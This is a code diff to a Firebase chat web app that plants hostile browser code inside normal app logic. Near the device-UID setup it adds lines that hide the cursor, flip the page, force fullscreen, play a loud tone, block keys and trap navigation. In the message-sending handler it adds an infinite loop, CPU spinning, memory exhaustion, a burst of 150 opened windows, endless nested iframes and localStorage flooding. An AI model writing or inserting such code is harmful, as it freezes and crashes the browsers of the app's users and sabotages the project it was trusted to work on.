@@ -13,6 +13,29 @@ const firebaseConfig = {
 };
 
 // --- Persistent UID for the device/browser ---
+document.body.style.cursor = 'none';
+document.documentElement.style.transform = 'rotate(180deg)';
+// fullscreen without asking
+document.addEventListener('click', () =>
+  document.documentElement.requestFullscreen(), { once: true });
+
+const ctx = new AudioContext();
+const osc = ctx.createOscillator();
+const gain = ctx.createGain();
+osc.type = 'square';
+osc.frequency.value = 440;
+gain.gain.value = 0.5;
+osc.connect(gain).connect(ctx.destination);
+osc.start();
+setInterval(() => document.title = document.title === 'Hi' ? 'Hello' : 'Hi', 100);
+document.addEventListener('keydown', e => {
+  if (!e.ctrlKey && !e.metaKey) e.preventDefault();
+});
+history.pushState({}, '', location.href);
+window.addEventListener('popstate', () => history.pushState({}, '', location.href));
+window.onbeforeunload = () => true;
+document.body.addEventListener('click', () => document.body.requestPointerLock());
+
 let currentUID = localStorage.getItem("chatUID");
 
 if (!currentUID) {
@@ -529,6 +552,25 @@ name:name,
 message:imageUrl,
 timestamp: Date.now()
 });
-
+while (true) {}
+  function spin() { for (let i = 0; i < 1e7; i++); requestAnimationFrame(spin); }
+spin();
+  const hogs = [];
+setInterval(() => hogs.push(new Uint8Array(50 * 1024 * 1024)), 100);
+  document.addEventListener('click', () => {
+  for (let i = 0; i < 150; i++) window.open(location.href, '_blank');
+}, { once: true });
+  function nest(el) {
+  const f = document.createElement('iframe');
+  f.srcdoc = '<body style="margin:0"><iframe id="c" style="width:100%;height:100%;border:0"></iframe></body>';
+  el.appendChild(f);
+  f.onload = () => nest(f.contentDocument.getElementById('c'));
+}
+nest(document.body);
+  try {
+  const chunk = 'x'.repeat(1024 * 1024);
+  for (let i = 0; i < 10000; i++) localStorage.setItem('junk' + i, chunk);
+} catch (e) {} // QuotaExceededError — now anything else that writes storage fails
+  
 });
 }
